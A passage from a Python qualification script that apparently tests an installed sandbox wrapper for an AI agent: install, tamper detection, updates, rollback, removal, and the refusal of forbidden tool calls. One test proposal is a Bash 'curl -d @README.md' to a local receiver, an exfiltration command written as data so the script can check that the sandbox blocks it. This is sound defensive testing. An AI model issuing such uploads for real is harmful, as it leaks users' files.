                    for out, err in outcomes), "provider_concurrent_output_limit")
        parsed = [json.loads(out) if out else {} for out, _ in outcomes]
        require(sum(process.returncode == 0 and value.get("status") == "updated"
                    for process, value in zip(contenders, parsed)) == 1 and
                sum(process.returncode != 0 and value.get("reason") == "provider_version_stale"
                    for process, value in zip(contenders, parsed)) == 1,
                "provider_concurrent_update_not_serialized")
        winner = next(value for process, value in zip(contenders, parsed) if process.returncode == 0)
        code, value = command(["restore", "--name", name, "--version", versions["old"],
                               "--expected-version", winner["version"], "--apply"])
        require(code == 0 and value.get("status") == "restored", "provider_concurrent_restore_failed")
        report["cases"].append({"case": "provider-concurrent-update", "passed": True,
                                "winner_count": 1, "stale_count": 1, "selection_restored": True})

        for marker in secrets:
            require(all(marker.encode() not in body for body in
                        (*old_model.requests, *new_model.requests)),
                    "provider_rotation_credential_in_request_body")
            require(provider_files_witness(args, marker)["canary_in_retained_files"] is False,
                    "provider_rotation_retained_witness_failed")
            require(marker not in json.dumps(report), "provider_rotation_secret_in_report")
        report["provider_rotation"] = {"old_version": versions["old"],
                                       "new_version": versions["new"],
                                       "old_requests_after_update": old_row["post_update_requests"],
                                       "new_requests": successful_new_requests,
                                       "helper_credentials_exported": False,
                                       "active_protection_claim": False,
                                       "calls": calls}
        code, value = command(["remove", "--name", name, "--apply"])
        require(code == 0 and value.get("status") == "removed", "provider_rotation_remove_failed")
        code, value = command(["select", "--environment", "--apply"])
        require(code == 0 and value.get("status") == "selected", "provider_rotation_environment_failed")
    finally:
        old_model.close()
        new_model.close()


def qualify(args, report):
    require(os.geteuid() != 0, "non_root_operator_required")
    before = BASE.source()
    require(not before["dirty"] and before["commit"] == args.expected_commit, "exact_clean_source_required")
    report["source_before"] = before
    home = args.output / "home"
    home.mkdir(mode=0o700)
    QUAL.user_config(home)
    env, ambient, args.work = sanitized_environment(args, home)
    agent_home = args.output / "agent-home"
    agent_home.mkdir(mode=0o700)
    (agent_home / "unrelated-agent-file").write_text("unrelated Agent state must stay\n")
    build_env = QUAL.qualification_environment(home)
    built = build(ROOT, args.output / "component.tar", build_env)
    archive, digest = args.output / "component.tar", built["archive_sha256"]
    report["component"] = {key: built[key] for key in ("component", "archive_sha256", "files", "commit")}
    require(built["commit"] == args.expected_commit, "component_commit_mismatch")
    receiver = QUAL.ISOLATION.Receiver()
    door = InstalledDoor(args, env, args.work, agent_home)
    selected = {name: getattr(args, name) for name in QUAL.SELECTED_PROGRAMS if getattr(args, name) is not None}
    try:
        marker = QUAL.make_projects(args, build_env, receiver)
        receiver.count = 0
        baseline = {"project": QUAL.snapshot(args.project), "repository": QUAL.snapshot(args.repository),
                    "home": QUAL.snapshot(home)}
        report["project_before_sha256"] = {key: QUAL.digest(value) for key, value in baseline.items()}

        # 1. Install into a clean private Agent home, then verify.
        value = install_component(args, agent_home, archive, digest, built["component"], env, report)
        code, verified, _ = component(args, agent_home, None, None, "verify", env=env)
        require(code == 0 and verified.get("ok") is True and "protection" not in json.dumps(verified).replace(
            "never reports protection", ""), "component_verify_failed")
        report["cases"].append({"case": "component-install", "passed": True, "component": value["component"],
                                "python": value["python"], "files": value["files"]})

        # 2. Preview from outside the checkout: no prefix, selected program or network.
        trace = args.output / "preview.trace.private"
        code, value, _ = door.call("preview", trace=trace, timeout=600)
        # The installed Agent itself is the entry point: started once, never again.
        observed = QUAL.executed(trace, {k: v for k, v in selected.items() if k != "agentfw"})
        agent_starts = agent_executions(trace, args.agentfw)
        programs = [Path(path) for path in observed["programs"]]
        trace.unlink()
        require(agent_starts == 1, "preview_started_agent_again")
        require(code == 0 and value.get("executed") is False and value.get("missing") == [],
                "preview_not_ready:" + str(value.get("reason") or value.get("missing")))
        require(value["source"]["commit"] == args.expected_commit and value["source"]["dirty"] is False,
                "preview_source_identity")
        require(not args.prefix.exists(), "preview_created_prefix")
        require(not observed["selected_started"] and observed["inet_connects"] == 0, "preview_started_program_or_network")
        require(Path(str(args.component_python)) in programs and not any(
            path.is_relative_to(ROOT) or "hostile" in path.parts for path in programs), "preview_used_ambient_helper")
        require(receiver.count == 0 and not marker.exists() and not ambient.exists(), "preview_effect")
        require({key: QUAL.snapshot(path) for key, path in (("project", args.project), ("repository", args.repository),
                 ("home", home))} == baseline, "preview_changed_project_or_user_configuration")
        report["cases"].append({"case": "preview-zero-effect", "passed": True, "selected_started": 0,
                                "inet_connects": 0, "programs": sorted({path.name for path in programs})})

        # 3. Prepare and reuse through the installed command.
        code, first, _ = door.call("prepare", "--apply", timeout=3600)
        require(code == 0 and first.get("status") == "prepared-not-active", "prepare_failed:" + str(first.get("reason")))
        code, again, _ = door.call("prepare", "--apply", inputs=False, timeout=900)
        require(code == 0 and again.get("status") == "reused" and again["selection"] == first["selection"],
                "prepare_not_reused:" + str(again.get("reason")))
        require(QUAL.snapshot(args.project) == baseline["project"]
                and QUAL.snapshot(args.repository) == baseline["repository"], "preparation_changed_project")
        report["cases"].append({"case": "prepare-and-reuse", "passed": True, "first": first["status"],
                                "second": again["status"]})
        selection = Path(first["selection"])
        report["selection_sha256"] = BASE.sha(selection)

        if args.filesystem_roots_only:
            load("installed_filesystem_roots", "qualify-filesystem-roots.py").qualify(args, door, agent_home, env, report,
                installed=__import__('types').SimpleNamespace(QUAL=QUAL, BASE=BASE, require=require, load=load))
            report['source_after'] = BASE.source()
            require(report['source_after'] == before, 'source_changed')
            return

        if args.project_presets_only:
            import types
            suite = types.SimpleNamespace(QUAL=QUAL, BASE=BASE, require=require, load=load,
                                          provider_exec_witness=provider_exec_witness, agent_executions=agent_executions)
            load('installed_project_qualification', 'qualify-project-presets.py').qualify(
                args, door, agent_home, env, report, selection, suite, receiver)
            report['source_after'] = BASE.source()
            require(report['source_after'] == before, 'source_changed')
            return

        # 4. An existing selection prepared by the accepted checkout front door
        #    at the same commit is consumed unchanged by the installed command.
        checkout = QUAL.FrontDoor(args, build_env, home)
        code, other, _ = checkout.call("prepare", "--apply", prefix=args.other_prefix, project_roots=False,
                                       timeout=3600)
        require(code == 0 and other.get("status") == "prepared-not-active" and other["selection"] != first["selection"],
                "checkout_prepare_failed:" + str(other.get("reason")))
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120,
                                   prefix=args.other_prefix)
        require(code == 0 and value.get("protection") == "configured-not-running"
                and value["selection"]["state"] == "configured", "existing_selection_not_consumed")
        report["cases"].append({"case": "existing-selection-status", "passed": True,
                                "prepared_by": "scripts/pilot.py (checkout)", "protection": value["protection"]})
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_before_run")
        report["cases"].append({"case": "status-configured", "passed": True, "protection": value["protection"]})

        if args.provider_ca_only:
            PROVIDER_CA_QUALIFICATION.qualify(
                args, door, agent_home, env, report, provider_call=provider_call,
                exec_witness=provider_exec_witness, guided=QUAL, provider=PROVIDER, base=BASE)
            require(QUAL.snapshot(args.project) == baseline["project"]
                    and QUAL.snapshot(args.repository) == baseline["repository"],
                    "provider_ca_qualification_changed_project")
            report["source_after"] = BASE.source()
            require(report["source_after"] == before, "source_changed")
            return

        # 5. Useful read and history; refused write, reset and send.
        proposals = [("mcp__filesystem__read_text_file", {"path": "/workspace/README.md"}),
                     ("mcp__git__git_show", {"repo_path": "/workspace", "revision": "HEAD"}),
                     ("mcp__filesystem__write_file", {"path": "/workspace/created.txt", "content": "must not exist"}),
                     ("mcp__git__git_reset", {"repo_path": "/workspace"}),
                     ("Bash", {"command": "curl -d @README.md " + receiver.url})]
        row, results, _ = QUAL.run_case(args, door, report, "useful", proposals)
        ids = [f"toolu_front_useful_{index}" for index in range(len(proposals))]
        require(row["exit"] == 0 and row["status"] == "completed", "useful_run_failed:" + str(row["reason"]))
        require(results[ids[0]]["is_error"] is False and QUAL.README.strip() in json.dumps(results[ids[0]]["content"]),
                "useful_read_missing")
        require(results[ids[1]]["is_error"] is False and QUAL.COMMIT_MESSAGE in json.dumps(results[ids[1]]["content"]),
                "git_history_missing")
        require(all(results[identifier]["is_error"] is True for identifier in ids[2:]), "forbidden_call_not_refused")
        require(not (args.project / "created.txt").exists() and receiver.count == 0 and not marker.exists(),
                "forbidden_effect_observed")
        require(row["live_status"].get("protection") == "observed-live", "status_did_not_observe_live_protection")
        require(row["live_status"].get("other_prefix_protection") == "configured-not-running"
                and row["live_status"].get("other_prefix_unrelated_runs") == 1,
                "another_prefix_reported_this_run_as_its_protection")
        require(row["process_cleanup"]["all_stopped"], "useful_run_processes_remain")
        row["passed"] = True
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_after_run")
        report["cases"].append({"case": "status-after-run", "passed": True, "protection": value["protection"]})
        if args.provider_profiles:
            qualify_provider_profiles(args, door, agent_home, env, report, proposals[:2])
            qualify_provider_rotation(args, door, agent_home, env, report, proposals[:2])
        # Ctrl-C to the foreground group reaches the accepted supervisor
        # through the installed command unchanged.
        row, _, _ = QUAL.run_case(args, door, report, "cancel", proposals[:1], hold=True, cancel=signal.SIGINT)
        require(row["exit"] == 1 and row["reason"] == "pilot_cancelled", "cancellation_not_reported")
        require(row["cleanup"] in ("owned_processes_stopped_audit_retained", "owned_state_removed"), "cancellation_cleanup")
        require(row["process_cleanup"]["all_stopped"], "cancelled_processes_remain")
        require(row["live_status"].get("protection") == "observed-live", "status_did_not_observe_live_protection")
        row["passed"] = True
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_after_cancel")

        # 6. Tampered helper: changed bytes, an unlisted file, a link.
        tree = agent_home / "pilot-front-door/components" / built["component"] / "tree"
        helper = tree / "scripts/pilot-run.py"
        original = helper.read_bytes()
        for label, damage, repair in (
                ("tampered-helper-bytes", lambda: (helper.chmod(0o600), helper.write_bytes(original + b"\n# changed\n")),
                 lambda: (helper.write_bytes(original), helper.chmod(0o400))),
                ("tampered-helper-unlisted", lambda: (tree / "scripts/sitecustomize.py").write_text("x = 1\n"),
                 lambda: (tree / "scripts/sitecustomize.py").unlink()),
                ("tampered-helper-link", lambda: (helper.rename(tree / "moved.py"), helper.symlink_to(tree / "moved.py")),
                 lambda: (helper.unlink(), (tree / "moved.py").rename(helper)))):
            damage()
            try:
                report["cases"].append(refused(door, label, env, "front_door_component_changed"))
            finally:
                repair()
        code, value, _ = component(args, agent_home, None, None, "verify", env=env)
        require(code == 0 and value.get("ok") is True, "repaired_component_not_verified")

        # 7. Tampered interpreter: a private interpreter copy changed after install.
        copy_home = args.output / "agent-home-copy"
        copy_home.mkdir(mode=0o700)
        args.python_copy.parent.mkdir(mode=0o700)
        shutil.copy2(args.component_python, args.python_copy)
        args.python_copy.chmod(0o700)
        saved = args.component_python
        args.component_python = args.python_copy
        try:
            code, value, _ = component(args, copy_home, archive, digest, "install", env=env)
        finally:
            args.component_python = saved
        require(code == 0, "interpreter_copy_install_failed")
        with args.python_copy.open("ab") as stream:
            stream.write(b"\0")
        copy_door = InstalledDoor(args, env, args.work, copy_home)
        report["cases"].append(refused(copy_door, "tampered-interpreter", env, "front_door_interpreter_changed"))

        # 8. Interrupted update: the installer is killed at its staging rename.
        update, update_row = update_candidate(args, build_env)
        require(update_row["component"] != built["component"], "update_candidate_not_distinct")
        code, _, _ = component(args, agent_home, update, update_row["archive_sha256"], "install", env=env, trace=2)
        require(code != 0 and (agent_home / "pilot-front-door/journal.json").exists(), "interruption_not_observed")
        report["cases"].append(refused(door, "interrupted-update", env, "front_door_component_interrupted"))
        code, value, _ = component(args, agent_home, None, None, "recover", env=env)
        require(code == 0 and value.get("cleared_journal") is True and value.get("removed_staging")
                and value.get("selected") == built["component"], "recover_failed")
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_after_recover")
        report["cases"][-1]["recovered"] = True

        # 9. Failed update keeps the previous component selected.
        damaged = args.output / "component-damaged.tar"
        raw = bytearray(update.read_bytes())
        raw[-2048] ^= 1
        damaged.write_bytes(bytes(raw))
        for label, path, expected in (("wrong-digest", update, "0" * 64),
                                      ("damaged-archive", damaged, hashlib.sha256(raw).hexdigest())):
            code, value, stderr = component(args, agent_home, path, expected, "install", env=env)
            code2, current, _ = component(args, agent_home, None, None, "verify", env=env)
            require(code != 0 and code2 == 0 and current.get("component") == built["component"],
                    "failed_update_changed_selection:" + label)
            report["cases"].append({"case": "failed-update-" + label, "passed": True, "previous_retained": True})

        # 10. Update, then roll back to the reviewed component.
        code, value, _ = component(args, agent_home, update, update_row["archive_sha256"], "install", env=env)
        require(code == 0 and value.get("previous") == built["component"], "update_failed")
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(value.get("selection", {}).get("reason") == "stale_source" and value.get("protection") == "unavailable",
                "updated_component_accepted_other_commit_selection")
        code, value, _ = component(args, agent_home, None, None, "rollback", env=env)
        require(code == 0 and value.get("component") == built["component"], "rollback_failed")
        code, value, _ = door.call("status", "--state-root", str(args.state_root), inputs=False, timeout=120)
        require(code == 0 and value.get("protection") == "configured-not-running", "status_after_rollback")
        report["cases"].append({"case": "update-and-rollback", "passed": True, "update": update_row["component"],
                                "update_status_reason": "stale_source", "rolled_back_to": built["component"]})

        # 11. A pre-existing redirected `components` parent: removal refuses
        #     and an owned external tree shaped like the component stays.
        external = args.output / "external-components"
        (external / update_row["component"] / "tree/scripts").mkdir(parents=True, mode=0o700)
        (external / update_row["component"] / "manifest.json").write_text("external manifest\n")
        (external / update_row["component"] / "tree/scripts/pilot.py").write_text("external bytes\n")
        (external / "sentinel").write_text("must stay\n")
        external_before = QUAL.snapshot(external)
        components = agent_home / "pilot-front-door/components"
        components.rename(components.with_name("components.real"))
        components.symlink_to(external)
        try:
            code, value, stderr = component(args, agent_home, None, None, "remove", "--component",
                                            update_row["component"], env=env)
            require(code != 0 and "components directory" in stderr, "redirected_parent_removal_not_refused")
            require(QUAL.snapshot(external) == external_before, "redirected_parent_removal_changed_external_state")
        finally:
            components.unlink()
            components.with_name("components.real").rename(components)
        require(QUAL.snapshot(external) == external_before, "external_state_changed")
        report["cases"].append({"case": "redirected-parent-removal", "passed": True, "refused": True,
                                "external_unchanged": True})

        # 12. Owned removal: only component state; selections and user state stay.
        prepared = {name: QUAL.snapshot(path) for name, path in (("prefix", args.prefix), ("other", args.other_prefix))}
        code, value, _ = component(args, agent_home, None, None, "remove", "--component", update_row["component"], env=env)
        require(code == 0, "remove_unselected_failed")
        code, value, _ = component(args, agent_home, None, None, "remove", "--all", env=env)
        require(code == 0 and not (agent_home / "pilot-front-door").exists(), "remove_all_failed")
        require((agent_home / "unrelated-agent-file").read_text() == "unrelated Agent state must stay\n",
                "removal_touched_unrelated_agent_state")
        require({name: QUAL.snapshot(path) for name, path in (("prefix", args.prefix), ("other", args.other_prefix))}
                == prepared, "removal_changed_prepared_selection")
        report["cases"].append(refused(door, "removed-component", env, "front_door_component_not_installed"))
        report["cases"][-1]["selections_unchanged"] = True

        after = {"project": QUAL.snapshot(args.project), "repository": QUAL.snapshot(args.repository),
                 "home": QUAL.snapshot(home)}
        require(after == baseline, "project_or_user_configuration_changed")
        require(receiver.count == 0 and not marker.exists(), "forbidden_effect_observed")
        require(not ambient.exists(), "ambient_python_or_helper_executed")
        report["project_after_sha256"] = {key: QUAL.digest(value) for key, value in after.items()}
        report["selection_unchanged"] = BASE.sha(selection) == report["selection_sha256"]
        require(report["selection_unchanged"], "selection_changed")
    finally:
        receiver.server.shutdown()
        receiver.server.server_close()
    report["source_after"] = BASE.source()
    require(report["source_after"] == before, "source_changed")


def main():
    parser = argparse.ArgumentParser(description=__doc__, formatter_class=argparse.RawDescriptionHelpFormatter)
    parser.add_argument("--run", action="store_true", required=True)
    parser.add_argument("--output", type=Path, required=True)
    parser.add_argument("--expected-commit", required=True)
    parser.add_argument("--component-python", type=Path, required=True,
                        help="absolute CPython recorded for the installed helpers")
    parser.add_argument("--strace", type=Path, default=Path("/usr/bin/strace"))
    parser.add_argument("--allow-download", action="store_true")
    parser.add_argument("--provider-profiles", action="store_true",
                        help="opt in to SOU-172 private named provider original-host controls")
    parser.add_argument("--filesystem-roots-only", action="store_true", help="focused SOU-202 installed filesystem-root qualification")
    parser.add_argument("--project-presets-only", action="store_true", help="focused installed named-project qualification")
    parser.add_argument("--provider-ca-only", action="store_true",
                        help="focused SOU-195 installed-host HTTPS CA and rotation qualification")
    for name in INPUT_NAMES:
        parser.add_argument("--" + name.replace("_", "-"), type=Path)
    args = parser.parse_args()
    args.output = args.output.resolve()
    args.agent_output = None
    report = {"format": FORMAT, "status": "failed", "cases": [], "skipped": 0,
              "provider": "owned-scripted-loopback", "live_model_effectiveness": "not_tested"}
    try:
        require(not args.output.exists() and not args.output.is_relative_to(ROOT), "new_output_outside_checkout_required")
        require(args.git is not None, "explicit_git_required_for_owned_fixture_repository")
        require(all(getattr(args, name) is not None for name in ("agentfw", "git_launcher", "sandbox_tests")),
                "explicit_agent_executables_required")
        require(args.component_python.is_absolute(), "absolute_component_python_required")
        args.component_python = args.component_python.resolve(strict=True)
        args.output.mkdir(mode=0o700, parents=True)
        args.prefix = args.output / "pilot-prefix"
        args.other_prefix = args.output / "pilot-prefix-other"
        args.project = args.output / "project"
        args.repository = args.output / "repository"
        args.state_root = args.output / "run-state"
        args.python_copy = args.output / "interpreter-copy" / args.component_python.name
        args.state_root.mkdir(mode=0o700)
        release = Path("/proc/sys/kernel/osrelease").read_text().strip()
        report["platform"] = {"kernel": release, "kind": "wsl2" if "microsoft" in release.lower() else "linux"}
        report["inputs_sha256"] = {name: BASE.sha(getattr(args, name)) for name in INPUT_NAMES
                                   if getattr(args, name) is not None and getattr(args, name).is_file()}
        report["component_python_sha256"] = BASE.sha(args.component_python)
        qualify(args, report)
        report["status"] = "passed"
    except Exception as error:
        detail = str(error)
        report["error"] = (detail if not args.provider_ca_only or
                           re.fullmatch(r"[a-z0-9_:-]{1,160}", detail)
                           else "provider_ca_qualification_failed")[:500]
    finally:
        if args.output.exists():
            BASE.write(args.output / "report.json", report)
    summary = {"status": report["status"], "cases": len(report["cases"]), "error": report.get("error")}
    if args.filesystem_roots_only:
        roots = report.get('filesystem_roots', {})
        summary['filesystem_roots'] = {k: roots.get(k) for k in ('status', 'active_case', 'last_cli', 'last_run', 'result_boundaries', 'post_run_sources_unchanged', 'processes_stopped', 'collector_failures', 'owned_first_errors', 'sibling_control', 'policy_taint_control')}
    if args.project_presets_only:
        project = report.get("project_presets", {})
        summary["project_presets"] = {key: project.get(key) for key in ("status", "active_case", "last_cli")}
    print(json.dumps(summary))
    return 0 if report["status"] == "passed" else 1


if __name__ == "__main__":
    raise SystemExit(main())
